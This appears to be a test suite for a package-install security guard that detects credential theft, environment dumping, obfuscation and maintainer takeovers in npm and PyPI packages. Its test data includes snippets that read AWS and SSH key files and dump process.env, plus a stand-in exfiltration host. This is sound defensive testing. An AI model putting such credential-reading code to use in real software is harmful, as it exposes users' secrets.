    expect(sev("curl-pipe")).toEqual(expect.arrayContaining(["pkg:content:pipe:high"]));
    expect(sev("persist")).toEqual(expect.arrayContaining(["pkg:content:persist:high"]));
    expect(sev("py-setup", "sdist")).toEqual(expect.arrayContaining(["pkg:content:exec:critical", "pkg:content:ip:high"]));
    expect(sev("py-pth", "wheel")).toEqual(expect.arrayContaining(["pkg:content:exec:high"]));
  });

  test("legitimate shapes are not: native builds, binary downloaders, SDKs reading their own credentials, .env loaders", () => {
    for (const name of ["colors-v1", "native-addon", "binary-fetch", "aws-like", "dotenv-like"]) {
      const top = grade(analyse(npmTgz(name), "npm", name)).filter((f) => f.severity !== "low" && f.severity !== "info");
      expect({ name, top: top.map((f) => f.title) }).toEqual({ name, top: [] });
    }
    expect(sev("binary-fetch")).toEqual(["pkg:content:download-run:low"]);
    expect(sev("native-addon")).toEqual(["pkg:content:gyp:low"]);
  });

  test("the same code weighs less when it only runs on import", () => {
    const lib = (code: string) => analyse(tgz([{ path: "package/package.json", data: '{"name":"t","version":"1.0.0"}' }, { path: "package/index.js", data: code }]), "npm");
    const oneKind = "const https = require('https');\nconst key = fs.readFileSync(home + '/.aws/credentials');\n";
    // One kind of credential next to network code: an SDK's shape, said but not stopped.
    expect(rules(grade(lib(oneKind)))).toEqual(["pkg:content:m-secrets:low"]);
    // Several kinds at once in that code is a stealer's shape, on import too.
    expect(rules(grade(lib(oneKind + "const k2 = read(home + '/.ssh/id_rsa');\n")))).toEqual(["pkg:content:m-secrets:high"]);
    // The same code at install is high with one kind already.
    const hooked = analyse(tgz([{ path: "package/package.json", data: '{"name":"t","version":"1.0.0","scripts":{"postinstall":"node index.js"}}' }, { path: "package/index.js", data: oneKind }]), "npm");
    expect(rules(grade(hooked))).toEqual(["pkg:content:steal:high"]);
  });
});

describe("version diff", () => {
  const meta = (v: string, extra: object = {}) => ({ eco: "npm" as const, name: "vs-fixture-colors", version: v, ...extra });
  const v1 = () => ({ meta: meta("1.0.0", { publisher: "alice", maintainers: ["alice"], provenance: true }), scanned: scanPackage(stripTop(readTgz(npmTgz("colors-v1"))), "npm") });
  const v2 = (extra: object = {}) => ({ meta: meta("1.0.1", { publisher: "alice", maintainers: ["alice"], provenance: true, publishedAt: Date.now() - 3_600_000, ...extra }), scanned: scanPackage(stripTop(readTgz(npmTgz("colors-v2"))), "npm") });

  test("v2 adds a postinstall that reads keys and sends: the diff says so, and the new script raises it", () => {
    const f = grade(v2(), v1());
    const diff = f.find((x) => x.id.startsWith("pkg:content:diff"))!;
    expect(diff.title).toContain("new since 1.0.0: adds an install script 1.0.0 did not have: postinstall: node scripts/setup.js");
    expect(diff.detail.join("\n")).toContain("its install code now reads where keys are kept");
    expect(diff.detail.join("\n")).toContain("its install code now dumps the environment");
    expect(f.find((x) => x.id.startsWith("pkg:content:steal"))!.severity).toBe("high");
    // The same release from an account that was not a maintainer, without the provenance 1.0.0 had: more weight.
    const taken = grade(v2({ publisher: "mallory", provenance: false }), v1());
    expect(taken.find((x) => x.id.startsWith("pkg:content:steal"))!.severity).toBe("critical");
    expect(taken.find((x) => x.id.startsWith("pkg:content:diff"))!.severity).toBe("critical");
    expect(taken.find((x) => x.id.startsWith("pkg:content:diff"))!.detail.join("\n")).toContain("published by mallory; 1.0.0 was published by alice");
  });

  test("nothing new, nothing said; a CI publisher or a maintainer publishing is not a takeover", () => {
    expect(grade(v1(), v1())).toEqual([]);
    expect(takenOver({ ...meta("2"), publisher: "GitHub Actions" }, { ...meta("1"), publisher: "alice" })).toBe(false);
    expect(takenOver({ ...meta("2"), publisher: "bob" }, { ...meta("1"), publisher: "alice", maintainers: ["alice", "bob"] })).toBe(false);
    expect(takenOver({ ...meta("2"), publisher: "mallory" }, { ...meta("1"), publisher: "alice", maintainers: ["alice"] })).toBe(true);
    expect(takenOver({ ...meta("2"), publisher: "alice" }, { ...meta("1"), publisher: "alice", provenance: true })).toBe(true);
  });

  test("obfuscated code that appears in a release is high on its own; a sudden size jump and new dependencies are listed", () => {
    const lib = (code: string, deps: object = {}) => scanPackage(stripTop(readTgz(tgz([{ path: "package/package.json", data: JSON.stringify({ name: "l", version: "1", dependencies: deps }) }, { path: "package/index.js", data: code }]))), "npm");
    const before = { meta: meta("4.4.1"), scanned: lib("module.exports = 1;\n") };
    const after = { meta: meta("4.4.2"), scanned: lib(readFileSync(join(FIX, "obfuscated-lib/index.js"), "utf8") + "\n// " + "x".repeat(200_000), { "flatmap-stream": "^0.1.0" }) };
    const d = grade(after, before, { newDeps: [{ name: "flatmap-stream", createdAt: Date.now() - 5 * 86_400_000 }] }).find((x) => x.id.startsWith("pkg:content:diff"))!;
    expect(d.severity).toBe("high");
    const all = [d.title, ...d.detail].join("\n");
    expect(all).toContain("its code now decodes and runs hidden code (absent in 4.4.1)");
    expect(all).toContain("adds the dependency flatmap-stream, a package created 5 days ago");
    expect(all).toMatch(/grew from 0 KB to 2\d\d KB/);
  });

  test("previous version: semver and PEP 440 order, pre-releases skipped unless current is one", () => {
    expect(previousVersion(["1.0.0", "1.0.1", "1.1.0-beta.1", "1.1.0", "2.0.0", "0.9.9"], "1.1.0")).toBe("1.0.1");
    expect(previousVersion(["0.7.28", "0.7.29", "0.8.0", "1.0.0"], "0.7.29")).toBe("0.7.28");
    expect(previousVersion(["1.0.0", "2.0.0rc1", "2.0.0rc2"], "2.0.0rc2")).toBe("2.0.0rc1");
    expect(previousVersion(["1.0.0"], "1.0.0")).toBeUndefined();
    expect(compareLoose("1.10.0", "1.9.0")).toBeGreaterThan(0);
    expect(compareLoose("2024.10.1", "2024.9.30")).toBeGreaterThan(0);
  });
});

describe("the guard reads contents", () => {
  test("checkInstall: v2 is stopped with the diff against v1, read once, then from the cache", async () => {
    const d = tmp("guard");
    const reg = registry([
      { name: "vs-fixture-colors", version: "1.0.0", bytes: npmTgz("colors-v1"), at: Date.now() - 300 * 86_400_000 },
      { name: "vs-fixture-colors", version: "1.0.1", bytes: npmTgz("colors-v2"), at: Date.now() - 3_600_000 },
    ]);
    const cache = osvCache(d, ["npm:vs-fixture-colors@1.0.1", "npm:root@1"]);
    const r = await checkInstall(plan("npm", ["install", "vs-fixture-colors"], d), { get: reg.get, osvCache: cache });
    expect(r.verdict).toBe("block");
    expect(r.read).toEqual(["vs-fixture-colors@1.0.1"]);
    const ids = r.findings.map((f) => f.id);
    expect(ids).toContain("pkg:content:steal:npm:vs-fixture-colors@1.0.1");
    expect(ids).toContain("pkg:content:diff:npm:vs-fixture-colors@1.0.1");
    expect(reg.calls.filter((u) => u.endsWith(".tgz")).length).toBe(2);
    // Again: both versions come from the cache, no archive is downloaded.
    const again = registry([], { down: /\.tgz$/ });
    const get2: Fetcher = (u, i) => (u.endsWith(".tgz") ? again.get(u, i) : reg.get(u, i));
    const r2 = await checkInstall(plan("npm", ["install", "vs-fixture-colors"], d), { get: get2, osvCache: cache });
    expect(r2.findings.map((f) => f.id)).toEqual(r.findings.map((f) => f.id));
    expect(again.calls).toEqual([]);
    expect(readdirSync(join(d, "pkg-content")).length).toBeGreaterThanOrEqual(2);
  });

  test("an archive that does not match the registry's checksum is critical", async () => {
    const d = tmp("integrity");
    const reg = registry([{ name: "vs-fixture-colors", version: "1.0.0", bytes: npmTgz("colors-v1"), integrity: sri(Buffer.from("something else")) }]);
    const r = await checkInstall(plan("npm", ["install", "vs-fixture-colors@1.0.0"], d), { get: reg.get, osvCache: osvCache(d, ["npm:vs-fixture-colors@1.0.0", "npm:root@1"]) });
    expect(r.findings[0]).toMatchObject({ rule: "pkg-integrity", severity: "critical" });
    expect(r.verdict).toBe("block");
    expect(integrityOk(Buffer.from("a"), { shasum: createHash("sha1").update("a").digest("hex") })).toBe(true);
    expect(integrityOk(Buffer.from("a"), { integrity: `sha1-x ${sri(Buffer.from("a"))}` })).toBe(true);
    expect(integrityOk(Buffer.from("a"), { sha256: "00" })).toBe(false);
    expect(integrityOk(Buffer.from("a"), {})).toBeUndefined();
  });

  test("the fast path: a popular, weeks-old, script-free package is not downloaded at all", async () => {
    const now = Date.now();
    expect(worthReading("npm", { exists: true, weeklyDownloads: 5e6, versionAt: now - 60 * 86_400_000, scripts: [] }, now)).toBe(false);
    expect(worthReading("npm", { exists: true, weeklyDownloads: 5e6, versionAt: now - 3 * 86_400_000, scripts: [] }, now)).toBe(true);
    expect(worthReading("npm", { exists: true, weeklyDownloads: 5e6, versionAt: now - 60 * 86_400_000, scripts: ["postinstall: node x"] }, now)).toBe(true);
    expect(worthReading("npm", { exists: true, weeklyDownloads: 40, versionAt: now - 600 * 86_400_000, scripts: [] }, now)).toBe(true);
    expect(worthReading("pip", { exists: true, createdAt: now - 3000 * 86_400_000, versionAt: now - 60 * 86_400_000 }, now)).toBe(false);
    expect(worthReading("pip", { exists: true, createdAt: now - 3000 * 86_400_000, versionAt: now - 60 * 86_400_000, sdistOnly: true }, now)).toBe(true);
  });

  test("offline: nothing is downloaded and nothing is said; a registry that fails is a notice, and --strict stops on it", async () => {
    const d = tmp("down");
    const reg = registry([{ name: "vs-fixture-colors", version: "1.0.1", bytes: npmTgz("colors-v2") }], { down: /\.tgz$/ });
    const cache = osvCache(d, ["npm:vs-fixture-colors@1.0.1", "npm:root@1"]);
    const off = await checkInstall(plan("npm", ["install", "vs-fixture-colors@1.0.1"], d), { get: reg.get, offline: true, osvCache: cache });
    expect(reg.calls).toEqual([]);
    expect(off.notes).toEqual([]);
    const r = await checkInstall(plan("npm", ["install", "vs-fixture-colors@1.0.1"], d), { get: reg.get, osvCache: cache });
    expect(r.verdict).not.toBe("block");
    expect(r.notes.join()).toContain("could not read the contents of vs-fixture-colors@1.0.1");
    expect(r.unverified.join()).toContain("contents of 1 package");
    const prev = process.env.VSWARM_SEC_DIR;
    process.env.VSWARM_SEC_DIR = tmp("sec");
    try {
      const ask = async () => false;
      expect(await pkgCommand("npm", ["install", "vs-fixture-colors@1.0.1"], { offline: false, get: reg.get, ask })).toBe(0);
      expect(await pkgCommand("npm", ["install", "vs-fixture-colors@1.0.1"], { offline: false, strict: true, get: reg.get, ask })).toBe(3);
    } finally {
      if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
      else process.env.VSWARM_SEC_DIR = prev;
    }
  });

  test("suspicious (medium) contents ask on a terminal, and stop under --strict", async () => {
    const bytes = tgz([{ path: "package/package.json", data: JSON.stringify({ name: "vs-fixture-env", version: "1.0.0", scripts: { postinstall: "node i.js" } }) }, { path: "package/i.js", data: "console.log(JSON.stringify(process.env).length)" }]);
    const reg = registry([{ name: "vs-fixture-env", version: "1.0.0", bytes }]);
    const prev = process.env.VSWARM_SEC_DIR;
    const sec = tmp("sec");
    process.env.VSWARM_SEC_DIR = sec;
    osvCache(sec, ["npm:vs-fixture-env@1.0.0", "npm:root@1"]);
    try {
      const asked: string[] = [];
      expect(await pkgCommand("npm", ["install", "vs-fixture-env@1.0.0"], { offline: false, get: reg.get, ask: async (q) => (asked.push(q), true) })).toBe(0);
      expect(asked[0]).toContain("Suspicious contents");
      expect(await pkgCommand("npm", ["install", "vs-fixture-env@1.0.0"], { offline: false, get: reg.get, ask: async () => false })).toBe(3);
      expect(await pkgCommand("npm", ["install", "vs-fixture-env@1.0.0"], { offline: false, strict: true, get: reg.get, ask: async () => false })).toBe(3);
      // The answer when you only press Enter, or when there is no terminal to ask on: no.
      const defaults: (boolean | undefined)[] = [];
      expect(await pkgCommand("npm", ["install", "vs-fixture-env@1.0.0"], { offline: false, get: reg.get, ask: async (_q, def) => (defaults.push(def), def ?? false) })).toBe(3);
      expect(defaults).toEqual([false]);
    } finally {
      if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
      else process.env.VSWARM_SEC_DIR = prev;
    }
  });

  test("dependencies: those with install scripts or new versions are read, the rest are not", async () => {
    const d = tmp("deps");
    const old = Date.now() - 400 * 86_400_000;
    const reg = registry([
      { name: "vs-app", version: "1.0.0", bytes: tgz([{ path: "package/package.json", data: '{"name":"vs-app","version":"1.0.0"}' }]), at: old },
      { name: "vs-fixture-cli-setup", version: "0.1.0", bytes: npmTgz("curl-pipe"), at: old },
      { name: "vs-quiet", version: "2.0.0", bytes: npmTgz("colors-v1"), at: old },
    ]);
    const get: Fetcher = async (u, i) => {
      if (u.includes(":dependencies")) return { status: 200, json: async () => ({ nodes: [{ versionKey: { name: "vs-app", version: "1.0.0" } }, { versionKey: { name: "vs-fixture-cli-setup", version: "0.1.0" } }, { versionKey: { name: "vs-quiet", version: "2.0.0" } }], edges: [{ fromNode: 0, toNode: 1 }, { fromNode: 0, toNode: 2 }] }) };
      return reg.get(u, i);
    };
    const r = await checkInstall(plan("npm", ["install", "vs-app"], d), { get, osvCache: osvCache(d, ["npm:vs-app@1.0.0", "npm:vs-fixture-cli-setup@0.1.0", "npm:vs-quiet@2.0.0"]) });
    expect(r.read.sort()).toEqual(["vs-app@1.0.0", "vs-fixture-cli-setup@0.1.0"]);
    const pipe = r.findings.find((f) => f.id.startsWith("pkg:content:pipe"))!;
    expect(pipe.detail).toContain("pulled in by vs-app");
    expect(r.verdict).toBe("block");
    // --deep reads all of it.
    const deep = await checkInstall(plan("npm", ["install", "vs-app"], d), { get, deep: true, osvCache: join(d, "osv.json") });
    expect(deep.read.sort()).toEqual(["vs-app@1.0.0", "vs-fixture-cli-setup@0.1.0", "vs-quiet@2.0.0"]);
  });

  test("PyPI: the wheel pip would pick, the sdist when there is none, setup.py and .pth findings", async () => {
    const files = [
      { filename: "x-1.0-cp312-cp312-win_amd64.whl", packagetype: "bdist_wheel" },
      { filename: "x-1.0-cp311-cp311-macosx_11_0_arm64.whl", packagetype: "bdist_wheel" },
      { filename: "x-1.0-cp312-cp312-macosx_11_0_arm64.whl", packagetype: "bdist_wheel" },
      { filename: "x-1.0-cp312-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", packagetype: "bdist_wheel" },
      { filename: "x-1.0.tar.gz", packagetype: "sdist" },
    ].map((f) => ({ ...f, url: `https://files.pythonhosted.org/${f.filename}` }));
    expect(pickPyFile(files, "darwin", "arm64")!.filename).toBe("x-1.0-cp312-cp312-macosx_11_0_arm64.whl");
    expect(pickPyFile(files, "linux", "x64")!.filename).toContain("abi3-manylinux");
    expect(pickPyFile(files, "win32", "x64")!.filename).toBe("x-1.0-cp312-cp312-win_amd64.whl");
    expect(pickPyFile(files, "linux", "arm64")!.filename).toBe("x-1.0.tar.gz");
    expect(pickPyFile([...files, { filename: "x-1.0-py3-none-any.whl", packagetype: "bdist_wheel", url: "u" }], "linux", "arm64")!.filename).toBe("x-1.0-py3-none-any.whl");

    const d = tmp("pypi");
    const py = [
      { name: "vs-fixture-requests-tools", version: "0.0.3", filename: "vs-fixture-requests-tools-0.0.3.tar.gz", packagetype: "sdist", bytes: tgz(filesOf("py-setup", "vs-fixture-requests-tools-0.0.3")) },
      { name: "vs-fixture-util", version: "1.0.0", filename: "vs_fixture_util-1.0.0-py3-none-any.whl", packagetype: "bdist_wheel", bytes: zip(filesOf("py-pth", "")) },
    ];
    const reg = registry([], { py });
    const r = await checkInstall(plan("pip", ["install", "vs-fixture-requests-tools==0.0.3", "vs-fixture-util==1.0.0"], d), { get: reg.get, osvCache: osvCache(d, ["PyPI:vs-fixture-requests-tools@0.0.3", "PyPI:vs-fixture-util@1.0.0", "PyPI:root@1"]) });
    expect(r.verdict).toBe("block");
    expect(r.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["pkg:content:exec:pip:vs-fixture-requests-tools@0.0.3", "pkg:content:exec:pip:vs-fixture-util@1.0.0"]));
    expect(r.findings.find((f) => f.id === "pkg:content:exec:pip:vs-fixture-requests-tools@0.0.3")!.title).toContain("during pip install (setup.py)");
  });

  test("an archive outside the registry, or too large, is not downloaded; the reason is said", async () => {
    const d = tmp("big");
    const reg = registry([{ name: "vs-fixture-colors", version: "1.0.0", bytes: npmTgz("colors-v1") }]);
    const get: Fetcher = async (u, i) => {
      const r = await reg.get(u, i);
      if (!/registry\.npmjs\.org\/vs-fixture-colors\/1\.0\.0$/.test(u)) return r;
      const m = await r.json();
      return { status: 200, json: async () => ({ ...m, dist: { ...m.dist, unpackedSize: 900_000_000 } }) };
    };
    const big = await contentCheck([{ eco: "npm", name: "vs-fixture-colors", version: "1.0.0" }], copt(get, d));
    expect(big.notes.join()).toContain("900 MB, too large to read during an install");
    const elsewhere: Fetcher = async (u, i) => {
      const r = await reg.get(u, i);
      if (!/registry\.npmjs\.org\/vs-fixture-colors\/1\.0\.0$/.test(u)) return r;
      const m = await r.json();
      return { status: 200, json: async () => ({ ...m, dist: { ...m.dist, tarball: "https://cdn.example.invalid/x.tgz" } }) };
    };
    const away = await contentCheck([{ eco: "npm", name: "vs-fixture-colors", version: "1.0.0" }], copt(elsewhere, d));
    expect(away.notes.join()).toContain("not the registry");
    expect(reg.calls.some((u) => u.includes("cdn.example.invalid"))).toBe(false);
  });

  test("vswarm pkg check reads without installing, keeps low findings, and exits 3 on BLOCK", async () => {
    const reg = registry([
      { name: "vs-fixture-fast-bundler", version: "0.30.0", bytes: npmTgz("binary-fetch") },
      { name: "vs-fixture-cli-setup", version: "0.1.0", bytes: npmTgz("curl-pipe") },
    ]);
    const prev = process.env.VSWARM_SEC_DIR;
    const sec = tmp("sec");
    process.env.VSWARM_SEC_DIR = sec;
    osvCache(sec, ["npm:vs-fixture-fast-bundler@0.30.0", "npm:vs-fixture-cli-setup@0.1.0", "npm:root@1"]);
    const out: string[] = [];
    const log = console.log;
    console.log = (s: string) => out.push(s);
    try {
      expect(await pkgCheckCommand("npm", "vs-fixture-fast-bundler@0.30.0", { get: reg.get, json: true })).toBe(0);
      const j = JSON.parse(out.pop()!);
      expect(j.read).toEqual(["vs-fixture-fast-bundler@0.30.0"]);
      expect(j.findings.map((f: any) => f.id)).toContain("pkg:content:download-run:npm:vs-fixture-fast-bundler@0.30.0");
      expect(await pkgCheckCommand("npm", "vs-fixture-cli-setup@0.1.0", { get: reg.get, json: true })).toBe(3);
      await expect(pkgCheckCommand("brew", "jq", {})).rejects.toThrow("usage");
      await expect(pkgCheckCommand("npm", "github:a/b", {})).rejects.toThrow("name a package");
    } finally {
      console.log = log;
      if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
      else process.env.VSWARM_SEC_DIR = prev;
    }
  }, 30_000);
});

describe("install scripts in the sandbox", () => {
  test("what runs: npm hooks (not node-gyp), setup.py, Python start-up for a .pth; nothing on Windows", () => {
    expect(hookCommand("npm", [{ name: "preinstall", cmd: "node a.js" }, { name: "install", cmd: "node-gyp rebuild" }, { name: "postinstall", cmd: "node b.js" }])).toEqual(["/bin/sh", "-c", "( node a.js ); ( node b.js )"]);
    expect(hookCommand("npm", [{ name: "install", cmd: "node-gyp rebuild (binding.gyp)" }])).toBeUndefined();
    expect(hookCommand("sdist", [{ name: "setup.py", cmd: "" }])).toEqual(["python3", "setup.py", "--name"]);
    expect(hookCommand("wheel", [{ name: ".pth", cmd: "" }])![0]).toBe("python3");
    expect(sandboxHere("win32")).toBe(false);
    expect(sandboxHere("darwin")).toBe(true);
    expect(sandboxHere("linux")).toBe(true);
  });

  // The fixture runs with node; a machine without it cannot run the fixture at all.
  const sandbox = !!Bun.which("node") && (process.platform === "darwin" || (process.platform === "linux" && !!Bun.which("bwrap")));
  test.skipIf(!sandbox)("v2's postinstall runs in the sandbox: it is seen reaching for the decoy keys and the network, and nothing leaves", async () => {
    const d = tmp("box");
    const prevTry = process.env.VSWARM_TRY_DIR;
    process.env.VSWARM_TRY_DIR = tmp("try");
    try {
      const reg = registry([{ name: "vs-fixture-colors", version: "1.0.1", bytes: npmTgz("colors-v2") }]);
      const r = await contentCheck([{ eco: "npm", name: "vs-fixture-colors", version: "1.0.1" }], copt(reg.get, d, { sandbox: "always", diff: false }));
      const ran = r.findings.filter((f) => f.rule === "pkg-sandbox");
      const text = ran.map((f) => [f.title, ...f.detail].join("\n")).join("\n");
      // The proxy records the host whether or not the system log can be read.
      expect(text).toContain("exfil.example.invalid");
      // The box is gone afterwards.
      expect(readdirSync(process.env.VSWARM_TRY_DIR!)).toEqual([]);
    } finally {
      if (prevTry === undefined) delete process.env.VSWARM_TRY_DIR;
      else process.env.VSWARM_TRY_DIR = prevTry;
    }
  }, 120_000);
});
